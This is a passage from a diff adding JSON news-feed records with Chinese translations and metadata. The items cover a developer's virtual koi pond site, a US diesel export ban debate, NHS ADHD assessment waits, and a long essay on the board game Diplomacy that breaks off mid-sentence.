+        "fullTranslation": "我叫保罗（Paul）。我是一名开发者、探索者，还患有注意力缺陷多动障碍（ADHD）。从八月初开始，我失业了。这一点，再加上过去这一年里发生的林林总总，给我带来了巨大的压力。\n\n在我们家阳台禅意花园项目尚未完工之际，我萌生了一个想法：做一个所有人都能使用的虚拟禅意花园。遗憾的是，这个想法已经被我搁置了一阵子，主要是因为我压根不知道该怎么做——我不会 JavaScript，而且眼下也没有精力去从头学习。于是我让“完美成了优秀的敌人”，好吧……就一直把这个想法藏在心里。\n\n后来我心想“去他的”，借由 AI 做出了我真正想做的东西。我意识到自己想要的不是“完美”，而是“足够好”。我反复微调、增加、删减、绘图、调研、提问、测试……我只是没有亲自编写代码而已。所以现在，它不再只是盘踞在我的脑海里，而是呈现在互联网上供大家享受。\n\n是的，完全凭一己之力做出东西确实有一种崇高感，但一个只停留在脑海里的想法又有什么用呢？所以，我做到了。我把它做了出来。这个古怪、小巧、宁静的锦鲤池。这个源于热忱的傻气小项目。这个让陌生人可以聚在一起静静看鱼的互联网小小角落。\n\n希望这个池塘带给你的帮助，能像它带给我的一样多。\n\n附言：是的，我仍在找工作！如果你觉得能帮上忙，请通过以下方式联系我：\n\n欢迎来到池塘——一个让你重获内心平静的宁静之地。你看到的锦鲤就是其他与你一同造访池塘的人，你想待多久都可以。",
+        "contentStatus": "full",
+        "translationStatus": "full",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 7,
+        "translationParagraphs": 7,
+        "keyTakeaways": [
+          "开发者 Paul 创建了一个名为 Koi.rest 的虚拟锦鲤池网站，供人们在线静心观赏游鱼。",
+          "Paul 自称患有 ADHD（注意力缺陷多动障碍），并自 8 月初起处于失业状态且正在求职。",
+          "来源叙事重点：叙事重点是：一名自称患有 ADHD、近期失业且承受压力的开发者，在不会 JavaScript、暂时无力系统学习的情况下借助 AI 完成了一个供陌生人共同观看虚拟锦鲤的简单网站。叙事将项目呈现为“够用即可”的个人创作、情绪调节空间和人与人之间的轻量线上共处，并包含求职信息。"
+        ],
+        "citations": [
+          {
+            "source": "Hacker News (科技前沿论坛)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T21:33:03.000Z",
+            "url": "https://koi.rest/"
+          }
+        ]
+      },
+      {
+        "id": "story-t-lower-fuel-prices-html-591f332ef5d1ac0e",
+        "title": "为何美国禁止柴油出口无法平抑燃料价格",
+        "originalTitle": "Why a U.S. Diesel Export Ban Won’t Lower Fuel Prices",
+        "source": "OilPrice (全球能源与原油大宗)",
+        "sourceSlug": "oilprice",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:00:00.000Z",
+        "pubTime": "2026-09-25 06:00",
+        "url": "https://oilprice.com/Energy/Energy-General/Why-a-US-Diesel-Export-Ban-Wont-Lower-Fuel-Prices.html",
+        "imageUrl": null,
+        "fullContent": "As the national average diesel price soared to a record $6.52 per gallon, the Trump Administration sent mixed signals this week about restricting U.S. diesel exports. The White House has denied that an export ban is in the works, even if President Donald Trump and Treasury Secretary Scott Bessent had hinted at the possibility hours earlier. Rumors and reports of a diesel ban sparked vehement opposition from the U.S. energy and manufacturing industries, while analysts say restricting exports would be a self-defeating exercise that would actually further raise fuel prices in America and undermine the U.S. economic and geopolitical strength. Why Diesel Prices Soared Despite the uptick in flows from the Strait of Hormuz, only 1 million barrels per day bpd out of an estimated up to 10 million bpd outbound flows are refined products, the rest is crude. Refinery capacity is constrained in the Middle East due to Iranian strikes on refineries and the trickle of fuel flows through Hormuz. Then there is also severely restricted capacity in Russia due to Ukrainian drone strikes at Russian refineries. Russia has banned diesel exports until the end of September and is likely to extend the ban through October. Executives at the top U.S. refiners estimate that 7-8 million bpd of petroleum products have been off the market for months, tightening global fuel supply, especially that of diesel. Refining fundamentals are very tight and getting tighter with the issues in Russia and the Middle East, Brian Mandell, Executive Vice President of Marketing & Commercial at Phillips 66, said on the Q2 earnings call in early August. \"We have 7 million barrels a day of refineries down in Asia and the Middle East and another 1.4 million barrels down in Russia. And the refineries, depending on the damage and the ability to get spare parts, are going to take a good long time to get back online,\" the executive added. Global refinery throughputs reached a summer peak of 81.4 million bpd in August, up by 960,000 bpd month on month. But this peak was 4.2 million bpd lower than a year ago, with losses spread across the Middle East, Russia, and crude importing economies in Asia, the International Energy Agency IEA said in its monthly report for September. Why A U.S. Export Ban Would Backfire Amid the global fuel crunch and record-high diesel prices in the U.S., some Republican Senators led by Iowa's Chuck Grassley are calling for a ban on diesel exports as record-high diesel prices are hitting American farmers and truckers. The White House and former oil executive and incumbent Energy Secretary, Chris Wright, ruled out a ban on diesel exports, despite President Trump and Treasury Secretary Bessent entertaining the idea and saying hours earlier that the Administration is reviewing whether a ban is feasible. \"The blunt tool of banning diesel exports definitely doesn't work,\" Wright said on Wednesday. \"If you can't export the diesel that comes out of our refineries, you run out of places to store it, and you have to reduce US refining, which would put upward pressure on gasoline prices and jet fuel prices,\" he added. U.S. business, energy, and manufacturing groups share Secretary Wright's view and urged President Trump to reject the idea of fuel export restrictions in a letter signed by three dozen industry associations including the American Petroleum Institute API, the American Fuel & Petrochemical Manufacturers AFPM, the National Association of Manufacturers, and the U.S. Chamber of Commerce. \"Export bans would lead to less fuel production, tighter supplies, and rising costs for American families, farmers, and truckers,\" the industry groups wrote in the letter. \"We, and indeed virtually every expert in the fuels market, fully agree with Secretaries Wright and Burgum that an export ban would force reductions in refining utilization, increase prices for gasoline and jet fuel, and lead to retaliatory actions from other countries.\" Today, U.S. refineries are producing about 5.3 million bpd of distillate fuel, while domestic demand averages about 3.6 million bpd, AFPM said last week in a brief explainer, \"Why a diesel export ban would backfire\". If exports are banned, refiners cannot stockpile unlimited diesel, and they would be forced to cut production, not only of diesel but also of gasoline, as these fuels are produced together, the fuel manufacturers' association said. \"Less fuel production means tighter supplies and higher prices for both diesel and gasoline,\" it noted. Moreover, U.S. regions depending on fuel imports, such as the Northeast, would face even higher fuel prices for all fuels ahead of winter because a U.S. ban would tighten diesel markets further, the U.S. industry associations said. Last but not least, America could lose its reliable supplier status and risk reducing its energy influence, they added. \"If we pull back, other countries will step in, our influence will shrink, and our adversaries will gain ground. America's energy exports are a source of economic and geopolitical strength,\" the association said in the letter. AFPM last week noted that \"Export bans do not create more fuel for Americans. They reduce U.S. fuel production, put upward pressure on prices, weaken energy security and hand market share to foreign competitors.\" Analysts at Capital Economics summed it all up in the title of their latest analysis, \"US export ban would add fuel to the diesel crisis\". By Tsvetana Paraskova for Oilprice.com",
+        "fullTranslation": "随着全美平均柴油价格飙升至创纪录的每加仑6.52美元，特朗普政府本周在是否限制美国柴油出口的问题上释放出相互矛盾的信号。尽管美国总统唐纳德·特朗普和财政部长斯科特·贝森特（Scott Bessent）在数小时前曾暗示过这种可能性，白宫随后否认正在酝酿出口禁令。有关柴油出口禁令的传言和报道引发了美国能源及制造业界的强烈反对，分析人士也表示，限制出口将是一种适得其反的举措，实际上会进一步推高美国国内燃料价格，并削弱美国在经济和地缘政治上的实力。\n\n柴油价格为何飙升\n\n尽管霍尔木兹海峡的通航流量有所回升，但在估计高达1000万桶/日的出境运输量中，仅有100万桶/日属于成品油，其余均为原油。由于伊朗对炼油厂的袭击以及通过霍尔木兹海峡的燃料运输仅呈细流状态，中东地区的炼油产能受到严重制约。此外，由于乌克兰对俄罗斯炼油厂发动无人机袭击，俄罗斯的产能也受到严重限制。俄罗斯已在9月底前禁止柴油出口，并有可能将禁令延长至10月。美国主要炼油商的高管估计，数月来已有700万至800万桶/日的石油产品撤出市场，从而收紧了全球燃料供应，尤其是柴油供应。\n\n菲利普斯66公司（Phillips 66）负责营销与商业的高级副总裁布莱恩·曼德尔（Brian Mandell）在8月初的第二季度财报电话会议上表示：“由于俄罗斯和中东面临的种种问题，炼油基本面非常紧张，且正变得更加严峻。我们在亚洲和中东有700万桶/日的炼油产能停摆，在俄罗斯还有140万桶/日停摆。视受损情况以及获取零部件的能力而定，这些炼油厂将需要很长一段时间才能恢复运营。”国际能源署（IEA）在9月份的月度报告中表示，8月份全球炼油厂加工量达到了8140万桶/日的夏季峰值，环比增长96万桶/日；但该峰值比去年同期低了420万桶/日，产能损失遍布中东、俄罗斯以及亚洲的原油进口经济体。\n\n为何美国实施出口禁令会适得其反\n\n在全球燃料告急、美国柴油价格创历史新高的背景下，以爱荷华州参议员查克·格拉斯利（Chuck Grassley）为首的部分共和党参议员呼吁禁止柴油出口，因为创纪录的高油价正在重创美国农民和卡车司机。白宫以及前石油高管、现任能源部长克里斯·赖特（Chris Wright）排除了实施柴油出口禁令的可能性，尽管特朗普总统和财政部长贝森特对这一想法持开放态度，并在数小时前表示政府正在评估禁令的可行性。“禁止柴油出口这一生硬的手段绝对行不通，”赖特周三表示，“如果无法出口我们炼油厂产出的柴油，存储空间就会耗尽，就不得不削减美国的炼油开工量，而这会对汽油价格和航空煤油价格带来上涨压力。”\n\n美国商界、能源界和制造业协会支持赖特部长的观点，并在由包括美国石油学会（API）、美国燃油与石化制造商协会（AFPM）、全美制造商协会（NAM）以及美国商会（U.S. Chamber of Commerce）在内的数十家行业协会联名签署的信件中，敦促特朗普总统放弃限制燃料出口的想法。各行业协会在信中写道：“出口禁令将导致燃料产量减少、供应进一步收紧，并推高美国家庭、农民和卡车司机的成本。我们——实际上也包括燃料市场上的几乎所有专家——完全赞同赖特部长和伯古姆（Burgum）部长的看法，即出口禁令将迫使炼油厂降低开工率，推高汽油和航空煤油的价格，并招致其他国家的报复性反制。”\n\nAFPM上周在题为《为何柴油出口禁令会适得其反》的简短说明中表示，目前美国炼油厂每天生产约530万桶馏分燃料，而国内日均需求量约为360万桶。该燃料制造商协会指出，如果禁止出口，炼油厂无法无限期储存柴油，将被迫削减产量，不仅削减柴油产量，还会连带削减汽油产量，因为这些燃料是在同一加工过程中产出的。“燃料产量减少意味着柴油和汽油的供应都将更加紧张，价格也会更高。”\n\n此外，美国各行业协会表示，在入冬之前，依赖燃料进口的美国地区（如东北部）将面临所有燃料价格进一步上涨的局面，因为美国的禁令将进一步收紧全球柴油市场。最后但同样重要的一点是，美国可能会失去其作为可靠供应国的地位，并面临能源影响力下降的风险。协会在信中指出：“如果我们退缩，其他国家就会趁虚而入，我们的影响力将缩水，而我们的对手将扩大地盘。美国的能源出口是经济和地缘政治实力的来源。”AFPM上周强调：“出口禁令不会为美国人创造更多燃料。它们只会减少美国的燃料产量，加大价格上涨压力，削弱能源安全，并将市场份额拱手让给外国竞争对手。”凯投宏观（Capital Economics）的分析师在其最新分析的标题中对此做了最凝练的总结：“美国出口禁令将为柴油危机火上浇油”。\n\n（作者：Tsvetana Paraskova，Oilprice.com）",
+        "contentStatus": "full",
+        "translationStatus": "full",
+        "contentSource": "official-page",
+        "contentKind": "official-page-body",
+        "contentParagraphs": 1,
+        "translationParagraphs": 10,
+        "keyTakeaways": [],
+        "citations": [
+          {
+            "source": "OilPrice (全球能源与原油大宗)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T22:00:00.000Z",
+            "url": "https://oilprice.com/Energy/Energy-General/Why-a-US-Diesel-Export-Ban-Wont-Lower-Fuel-Prices.html"
+          }
+        ]
+      },
+      {
+        "id": "story--adhd-autism-assessments-5f3edc09ab843459",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "NHS bodies in England impose two-year minimum wait for ADHD and autism assessments",
+        "source": "The Guardian Society (卫报社会与民生)",
+        "sourceSlug": "guardian",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T21:00:30.000Z",
+        "pubTime": "2026-09-25 05:00",
+        "url": "https://www.theguardian.com/society/2026/sep/24/nhs-integrated-care-boards-england-two-year-waiting-times-adhd-autism-assessments",
+        "imageUrl": "https://i.guim.co.uk/img/media/f8bf1d8867f33d6a507ea583a29ccb3ef2271128/659_79_3365_2693/master/3365.jpg?width=140&quality=85&auto=format&fit=max&s=f765cef514590fe349830d0244b4c471",
+        "fullContent": "Patient groups decry ‘scandalous’ delays as four integrated care boards take step due to soaring demand for diagnoses\n\nNHS bodies are forcing people with suspected attention deficit hyperactivity disorder and autism to wait at least two years before they can be assessed as they struggle to meet surging demand for diagnoses of neurodiversity.\n\nFour NHS integrated care boards (ICBs) covering large regions of England have adopted the approach because they cannot afford the cost of the number of assessments that people are seeking.",
+        "fullTranslation": "【官方正文已获取，中文全文翻译尚未完成；暂不展示外文正文。】",
+        "contentStatus": "full",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-body",
+        "contentParagraphs": 3,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "英格兰的 NHS 机构要求疑似患有注意缺陷多动障碍（ADHD）或自闭症的人至少等待两年才能接受评估。",
+          "覆盖英格兰大片地区的四个 NHS 综合护理委员会（ICB）采取了至少两年的等待安排。",
+          "来源叙事重点：聚焦四个英格兰 NHS 综合护理委员会为应对评估需求增加和费用压力，采用至少两年后才能接受 ADHD 或自闭症评估的安排；报道突出患者团体对延误的强烈批评，并将问题呈现为医疗服务可负担性与及时获得诊断之间的冲突。"
+        ],
+        "citations": [
+          {
+            "source": "The Guardian Society (卫报社会与民生)",
+            "sourceLang": "en",
+            "publishedAt": "2026-09-24T21:00:30.000Z",
+            "url": "https://www.theguardian.com/society/2026/sep/24/nhs-integrated-care-boards-england-two-year-waiting-times-adhd-autism-assessments"
+          }
+        ]
+      },
+      {
+        "id": "story-links-opportunities-html-25dfd717f1cde763",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "New research examines CIA failures, Saudi links and missed opportunities before September 11 attacks",
+        "source": "Phys.org (基础物理与技术前沿)",
+        "sourceSlug": "science",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T22:20:02.000Z",
+        "pubTime": "2026-09-25 06:20",
+        "url": "https://phys.org/news/2026-09-cia-failures-saudi-links-opportunities.html",
+        "imageUrl": "https://scx1.b-cdn.net/csz/news/tmb/2026/september-11.jpg",
+        "fullContent": "A new study from the University of Bath sheds light on critical U.S. intelligence failures ahead of the 9/11 attacks, including evidence that changes how the CIA's repeated failure to share information with the FBI about two hijackers should be understood.",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "short-source",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 1,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【Phys.org (基础物理与技术前沿)】于 2026-09-25 06:20 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "Phys.org (基础物理与技术前沿)",
+            "url": "https://phys.org/news/2026-09-cia-failures-saudi-links-opportunities.html",
+            "publishedAt": "2026-09-24T22:20:02.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story-rezident-2120141088-html-f137747d34359af5",
+        "title": "外文信源标题正在进行中文翻译，暂不展示未翻译标题",
+        "originalTitle": "Президент Ирана заявил о стремлении заключить сделку с США",
+        "source": "RIA Novosti (俄新社官方俄文)",
+        "sourceSlug": "ria",
+        "sourceLang": "ru",
+        "publishedAt": "2026-09-24T22:20:18.000Z",
+        "pubTime": "2026-09-25 06:20",
+        "url": "https://ria.ru/20260925/prezident-2120141088.html",
+        "imageUrl": null,
+        "fullContent": "",
+        "fullTranslation": "【官方仅提供短讯或摘要，中文全文翻译尚未完成；暂不展示外文摘要。】",
+        "contentStatus": "missing",
+        "translationStatus": "source-only",
+        "contentSource": "rss",
+        "contentKind": "rss-summary",
+        "contentParagraphs": 0,
+        "translationParagraphs": 0,
+        "keyTakeaways": [
+          "权威信源【RIA Novosti (俄新社官方俄文)】于 2026-09-25 06:20 发布，当前内容状态：仅有短讯/摘要",
+          "来源叙事与事实证据分开记录；若官方页面未公开完整正文，不以模板化内容替代。"
+        ],
+        "citations": [
+          {
+            "source": "RIA Novosti (俄新社官方俄文)",
+            "url": "https://ria.ru/20260925/prezident-2120141088.html",
+            "publishedAt": "2026-09-24T22:20:18.000Z"
+          }
+        ]
+      },
+      {
+        "id": "story--game-of-the-alpha-nerds-a8346c8636e8f4b5",
+        "title": "顶级极客的桌面游戏（2014）",
+        "originalTitle": "The Board Game of the Alpha Nerds (2014)",
+        "source": "Hacker News (科技前沿论坛)",
+        "sourceSlug": "hackernews",
+        "sourceLang": "en",
+        "publishedAt": "2026-09-24T20:53:39.000Z",
+        "pubTime": "2026-09-25 04:53",
+        "url": "https://grantland.com/features/diplomacy-the-board-game-of-the-alpha-nerds/",
+        "imageUrl": null,
+        "fullContent": "Before Risk, before Dungeons & Dragons, before Magic: The Gathering, there was Diplomacy. One writer enters international competition to play the world-conquering game that redefines what it means to be a geek (and a person).\n\nIt was the summer of 1909. I was on the south coast of Spain. I remember it well because the season was almost over. Peace was within reach, I felt. There had been a vote to end the war, and the English had told me to support it. But the vote needed to be unanimous to pass, and it failed. The Russian, the Italian, they thought the English voted against it and that I had been lied to. Why should I believe them? The English and I had worked together against all of them for years now. Of course they’d want to sow distrust between us. Now time was ticking. I desperately wanted peace. I wasn’t sure my country would survive another couple of years, with or without England’s help. There wouldn’t be another vote until after the fall.\n\n“Will you support my army in Spain this fall?” I asked.\n\n“Nah. That ain’t happenin’,” the Englishman replied. A wave of dread came over me. He intended to betray me.\n\n“How could you do this to me? After everything I’ve done for you.”\n\n“I guess I’m just a hard muthafucka like that.”\n\nAnd with that he walked away, leaving me standing in the hallway, mouth agape. He rejoined the other players at the board, who all stared at me, fury in their eyes. We told you so.\n\nFor the past eight hours I had been in the basement of a dorm in Chapel Hill, North Carolina, playing a board game called Diplomacy along with six other men. Each of us was vying against 80 other people to be crowned the world champion of Diplomacy at the end of the weekend here at Dixiecon.1 One of those men, Brian Ecton, a high school math teacher from Prince George’s County, Maryland, with hair like Katt Williams and a mouth to match, approached me right at the start, sizing me up as a beginner and offering an alliance. He explained exactly how it would work and said we’d share a draw at the end. I had no reason not to agree.\n\nFor the next several hours each of the other players would take turns dragging me aside to explain to me how Brian was manipulating me, how he was going to betray me, how I should betray him first and work with them against Brian. I dismissed them all. After all, who’s to say they wouldn’t betray me as well? I was outmatched in this game. Safer to pick a player and stick with him come what may, I thought. But here I stood, on the verge of elimination, and the other players were pissed. According to them, I could have avoided this if I had listened to them hours ago.\n\n“Don’t you realize that some of us traveled a very long distance to win this tournament?” a player from France said to me with disgust. “And because you won’t stab2 this guy, you’re going to die and bring all of us down with you.”\n\n“Are you going to be paid for writing this story?” a Scottish player asked me. “Because I am losing three days’ wages to be here so that I can get screwed by you.”\n\nI still don’t know whom I should have trusted, if anyone. All I know is that I felt stupid, stressed out, humiliated, and sad. I had several shouting matches with a few of these guys. Some of them got personal. And all I had to show for my loyalty to Brian Ecton and my righteous indignation toward the other players was nothing at all. I was physically exhausted and emotionally abused. I hated Brian, the other players all hated me, and I hated myself most of all. I had to purse my lips extra hard to fight the urge to cry.\n\nSettlers of Catan, eat your goddamn heart out.\n\nIf you’ve ever heard of Diplomacy, chances are you know it as “the game that ruins friendships.” It’s also likely you’ve never finished an entire game. That’s because Diplomacy requires seven players and seven or eight hours to complete. Games played by postal mail, the way most played for the first 30 years of its existence, could take longer than a year to finish. Despite this, Diplomacy is one of the most popular strategic board games in history. Since its invention in 1954 by Harvard grad Allan B. Calhamer, Diplomacy has sold over 300,000 copies and was inducted into Games Magazine’s hall of fame alongside Monopoly, Clue, and Scrabble.\n\nThe game is incredibly simple. The game board is a map of 1914 Europe divided into 19 sea regions and 56 land regions, 34 of which contain what are known as “supply centers.” Each player plays as a major power (Austria-Hungary, Turkey, Italy, England, France, Russia, Germany) with three pieces on the board (four for Russia) known as “home supply centers.” Each piece can move one space at a time, and each piece has equal strength. When two pieces try to move to the same space, neither moves. If two pieces move to the same space but one of those pieces has “support” from a third piece, the piece with support will win the standoff and take the space. The goal is to control 18 supply centers, which rarely happens. What’s more common is for two or more players to agree to end the game in a draw. Aside from a few other special situations, that’s pretty much it for rules.\n\nThere are two things that make Diplomacy so unique and challenging. The first is that, unlike in most board games, players don’t take turns moving. Everyone writes down their moves and puts them in a box. The moves are then read aloud, every piece on the board moving simultaneously. The second is that prior to each move the players are given time to negotiate with each other, as a group or privately. The result is something like a cross between Risk, poker, and Survivor — with no dice or cards or cameras. There’s no element of luck. The only variable factor in the game is each player’s ability to convince others to do what they want. The core game mechanic, then, is negotiation. This is both what draws and repels people to Diplomacy in equal force; because when it comes to those negotiations, anything goes. And anything usually does.\n\nThe year was 1966. A 17-year-old boy named Edi Birsan was sitting in his room in Brooklyn staring at a letter he received in the mail. He scanned the same sentence over and over: I am not against a three-way draw and I will not take any more supply centers … On the table in front of him was a Diplomacy game board, showing a game at about the midway point.\n\nTwo years before, Edi’s mother had split. She and Edi’s stepfather’s marriage had been on the rocks for years. They’d fight, break up, get back together, lather, rinse, repeat. One day in 1964 she forged Edi’s signature on a bank slip and withdrew $5,000, the entirety of a savings account Edi had had since he was 9 years old, and eventually lit out for California. She stopped off in Tijuana for a Mexican divorce, and that was that.\n\nBy his own admission, Edi was introverted and repressed. A year after his mom took off, Edi was in therapy. His therapist saw in him a need to channel his bottled-up aggression, and to learn how to trust people again. She gave him a gift — a board game. I read in a magazine that this was Kennedy’s favorite game. They’d play it in the White House.3 She told him it would help him deal with betrayal.\n\nNow here he was, midway through a game he had played well for months. He and two other players stood to share a three-way draw. He read the sentence in the letter again. I am not against a three-way draw and I will not take any more supply centers …\n\nEdi took out scissors and a pen from a drawer and set to work on the letter, painstakingly doctoring it. When he was finished he held up the letter proudly and read it to himself. I am against a three-way draw and I will take three more supply centers … He put the forgery in the mail to the third player. Then he waited.\n\nAllan Calhamer invented the game in 1954 while he was still a law student at Harvard. He aimed to sell it to one of the major game companies, but they all passed. In 1959 he self-financed 500 sets and sold them all to toy stores around New York. The game was picked up in 1961 by a small game publisher called Games Research. But because of how difficult it was to organize seven people for an entire day to play a game, sales were less than brisk.4 It looked like Diplomacy wasn’t long for this world. Until the nerds saved it.\n\nJohn Boardman was an editor of a number of amateur science fiction fanzines in 1963. In those days, pre–Star Trek, science fiction was still a highly niche subculture. Ever since the 1930s, fanzines were the primary way that sci-fi fans communicated and shared stories and ideas. John Boardman was also a fan of the game Diplomacy, but had a difficult time getting players together for a game. But he had an idea: He’d publish an ad in one of his sci-fi fanzines to see if anyone was interested in playing by mail. The response was encouraging. In May 1963, Boardman organized the first play-by-mail game of Diplomacy and the first Diplomacy zine, Graustark. Within four years there would be at least 32 more zines filled with postal Diplomacy games. Soon Games Research started promoting playing the game by mail by including the names and addresses of the zine editors with the game.\n\nAs Diplomacy grew in popularity across North America with play-by-mail games, some of the more hard-core players were curious about how they would fare against each other in a face-to-face game. What started out as a casual, informal gathering of top players in a backyard eventually grew to a yearly convention held on a college campus. They called it DipCon, and it became the definitive tournament for crowning the national Diplomacy champion.5\n\nIn 1976 the rights to the game were purchased by Avalon Hill, one of the largest publishers of strategy board games and war games in the world.6 The company had also started a gaming convention the year before in Baltimore called Origins. It invited the Diplomacy community to hold DipCon at Origins II, and the result was the largest Diplomacy tournament ever held in North America, with around 230 players.\n\nWith Avalon Hill’s support and reach, Diplomacy found an international audience and rapidly grew in popularity in Europe, particularly in the U.K. The game’s core community was still the editors and readers of the amateur zines, however. Through writings in those zines by new international players, the idea was floated that there should be a tournament in the U.K. In 1988, the first ever World DipCon was held in Birmingham, England, with the site rotating to a different country every year thereafter. Since 1988 the World DipCon has been held in 10 different countries. The winner of World DipCon is accepted around the world by the Diplomacy community as the official world champion.\n\nDavid Hood, a North Carolina attorney, arrived at the 2014 World DipCon opening ceremony driving a yellow Cadillac and wearing a seersucker suit. He arrived with Mrs. North Carolina, a beauty queen in full tiara and sash, in tow.7\n\nThe organizer of Dixiecon, Hood had been a fixture in the Diplomacy hobby for many decades and was a two-time North American champion. Hood had been running Dixiecon since the 1980s, when he was a student at UNC.8\n\nThe gathering of amateur diplomats for the 2014 World DipCon was a fairly homogeneous group. Among the 87 players were only two women, two players under the age of 21, and four African Americans, including 2005 Dixiecon champion Brian Ecton.9 The players were as you’d probably expect from any international gathering of board gamers: bookish, unkempt, and slightly awkward. There were exceptions to these stereotypes, to be sure. If there was one thing that this particular group of nerds was not, it was nebbish.\n\n“There is a definite amount of social awkwardness that goes along with any kind of gaming. You find the more social breed of gamer in Diplomacy,” said Siobhan Nolen, a hip, 28-year-old history grad student from Northern California and one of the two women entered in this year’s World DipCon. Her red hair was pulled back in a pony tail, revealing a Scrabble tile tattoo on the back of her neck. The daughter of a hard-core board-gamer who dragged her to conventions her entire life, Nolen is as expert in the culture of board-game nerds as anyone you’ll find. “This is a kind of alpha. It attracts very intelligent people. It attracts extroverted people. If you’re introverted and won’t put yourself out there, it won’t work out for you. It attracts people who like to talk. If you don’t like to talk, this game’s over pretty quickly for you.”\n\nNolen got hooked on Diplomacy when she was 13 years old. Her father had brought her to a gaming convention called Conquest. She was a bored adolescent wandering around the convention with her brother, not interested in playing any of the games. Then she came across six people sitting at a Diplomacy board, many of them not much older than she was. The oldest player, a man in his fifties, beckoned. “We need one more player.” Nolen looked at the board, the pieces, the players. On the face it looked like another boring war game like her dad played. “No way am I going to play that,” she replied. But Diplomacy was different from any game she had ever played. It wasn’t just tactics, just pushing pieces on a board. In fact, it was barely that. It had a human element. She found that in her very first game she was able to win against older, more experienced gamers just because she was good at convincing them to help her out. She was captivated by it. The older player asked her if she’d like to play again sometime and asked her for her email. His name was Edi Birsan.\n\nThe year was 1999. A 50-year-old Edi Birsan sat in front of his computer, the glow from the monitor the only light in the room. He stared at the email on the screen. I do not accept your terms …\n\nOver the past 30 years Birsan had become something of a legend in the Diplomacy community. He helped grow the hobby through publishing his own play-by-mail zines in the 1970s, then by helping organize many of the larger DipCon events. He established a national organization to set rules and guidelines and he traveled to other countries to play in European Diplomacy events well before there was a World DipCon. He had even played with Allan B. Calhamer, the game’s inventor, and drubbed him.10\n\nOne thing that Birsan was sure of was that the game was better when played face-to-face. He much preferred the tournaments and house games he traveled to over the games played by mail. With the advent of the Internet, face-to-face Diplomacy had been dwarfed by the volume of people now playing the game over email. So much so that an email game had been organized to pit the top email players against the top face-to-face players. Birsan was one of those face-to-face players. And he wasn’t happy about the way this game had been going.\n\nI do not accept your terms …\n\nBirsan picked up the telephone and dialed 411. He asked for a number in Houston, wrote it down, and then hung up the receiver. He took a deep breath, then picked up the phone and dialed.\n\n“This is Edi Birsan.”\n\n“I want to talk about this email you sent me.”\n\n“What do you mean ‘no’?”\n\n“I can’t believe you called me on the phone! You can’t do that!”\n\n“I’ve been doing this for 30 years!”\n\n“I’ve been playing Diplomacy for over three years and I’ve never once received a phone call or even talked to another player.”\n\n“Don’t ever call me again.”\n\nIt was well past one o’clock in the morning in a suite on the second floor of our dorm when someone first suggested that we vote for a draw. My first match at Dixiecon had begun around 7 p.m. and there had been only one player eliminated from the game in six hours. Of the six of us remaining, one player, a former world champion named Chris Martin, was playing as Italy and down to a single unit, an army stuck somewhere in Austria. Without any other pieces to lend himself support, Martin was as good as eliminated — unless he had an ally to keep him in the game.\n\nMartin, who has a PhD in dance, is a soft-spoken, fast-talking charmer whom other Diplomacy players call “the newbie whisperer” because of his affinity for allying with inexperienced players and getting them to do his bidding. He revels in this. Martin was knocking on death’s door when he convinced me, Siobhan Nolen, and a University of Arizona economics professor named Mark Stegeman to keep him alive. His reasoning? None of us was good enough at the game tactically to survive the alliance of the other two players, whether we stuck together or not.\n\nHe had a point, even if it was completely self-serving. The other two players on the board were Toby Harris, a top British player whose shaved head gave him a passing resemblance to Jason Statham and who was one of the favorites (along with Martin) to win the world championship; and Andy Bartalone, a Mack truck of a man with a booming voice and a penchant for booze and gambling — everyone affectionately called him “Buffalo.” Toby and Buffalo were not interested in any six-way draw. Their proposal? Kill Chris Martin and split it up five ways instead. More points for everyone!\n\n“They won’t do that,” Martin whispered to us outside in the hall. “Once I’m gone they will cut one of you up next. Maybe all three. Right now we can work together and form a stalemate line that they can’t break, and we can force them to draw.”\n\nMartin’s logic was sound. A stalemate line was an unbreakable formation that would force the game into a draw. The only way to break it would be to convince one of the players participating in it to betray the others. It was possible we could kill Martin and keep our stalemate line without him, but the three of us were unsure that we had the tactical skills to not make any mistakes. With Martin on our team, we were sure not to screw up. And, as Martin lied to us, eliminating him would net us only two points each.11\n\n“This is ridiculous!” bellowed Buffalo. “Siobhan, can we talk to you in the hall?”\n\nNolen looked at us and sh",
